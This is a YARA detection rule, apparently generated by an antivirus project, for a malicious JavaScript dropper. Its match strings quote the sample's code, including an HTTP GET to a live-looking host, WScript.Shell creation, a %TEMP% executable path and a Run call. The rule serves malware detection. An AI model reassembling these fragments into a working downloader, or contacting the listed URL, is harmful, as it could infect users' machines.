rule sig_20160401_ac9a7d9d2253ffbdadf43d433df89b26 {
  meta:
    description = "datamaliciousorder - file 20160401_ac9a7d9d2253ffbdadf43d433df89b26.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bbefc8995610d20267e8a9a3030c3771d37e7e94c5abf74828786162286d4ced"

  strings:
    $s1  = "HuoJw[VnXcu](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "function RwGw(AylMe, HgRn){RgaHju = RgaHju * 1; return AylMe - HgRn;};" fullword ascii
    $s3  = "var ReDxt = function PtOx() {return WScript[KsJh](\"WScript\"+\".Shell\");}(), EfBc = 11;" fullword ascii
    $s4  = "if (HuoJw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WzKyx(){return DudPjc + \"\";};" fullword ascii
    $s6  = "function UiOmx() {return ReDxt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"SMqmnsD6jVy95H5d.ex\" + \"e\";};" fullword ascii
    $s7  = "function XraMan() {return ((VeiVco == true) && (VeiVco == UkWp)) ? 1 : RgaHju;};" fullword ascii
    $s8  = "function GdYvd(){return KsJh;};" fullword ascii
    $s9  = "return RwGw(VeQy, LjWsq);" fullword ascii
    $s10 = "UkWp = true; " fullword ascii
    $s11 = "var VeiVco = false;" fullword ascii
    $s12 = "VeiVco = true; " fullword ascii
    $s13 = "var UkWp = false;" fullword ascii
    $s14 = "var TvaAi = new this[\"Date\"]();" fullword ascii
    $s15 = "function NnbKkl(KeeKv) {var GdAz = (1, 2, 3, 4, 5, KeeKv); return GdAz;};" fullword ascii
    $s16 = "}while (QyLl);" fullword ascii
    $s17 = "var NceHlp = false;" fullword ascii
    $s18 = "function CgIyy(RfGgm){ReDxt[\"R\"+\"un\"](RfGgm, RgaHju, RgaHju);};" fullword ascii
    $s19 = "function MzdNp(){return 23;};" fullword ascii
    $s20 = "function MpxBsd()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}